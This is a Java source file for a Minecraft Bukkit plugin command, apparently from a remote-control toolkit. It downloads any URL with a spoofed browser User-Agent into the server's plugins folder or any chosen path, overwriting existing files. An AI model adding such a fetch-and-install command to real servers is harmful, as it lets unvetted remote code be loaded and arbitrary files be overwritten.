package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.apache.commons.lang.ArrayUtils;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

public class Download implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"download"};
    }

    @Override
    public String getDescription() {
        return "Download a file from a url to a certain directory if specified.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "download <url  (https://domain.com/dir/file.jar )> ( ./directory/filename.jar)");
            return;
        }

        String[] splits = args[0].split("/");
        String fileName = splits[splits.length - 1];

        File saveTo = new File("./plugins/" + fileName);
        if (args.length > 1) {
            try {
                saveTo = new File(String.join(" ", (String[]) ArrayUtils.remove(args, 0)));
            } catch (Exception e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }
        }

        try {
            URL url = new URL(args[0]);
            URLConnection hc = url.openConnection();
            hc.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36");

            Files.copy(hc.getInputStream(), saveTo.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully saved " + fileName + " (" + args[0] + ") to " + saveTo.getPath() + "!");
    }
}
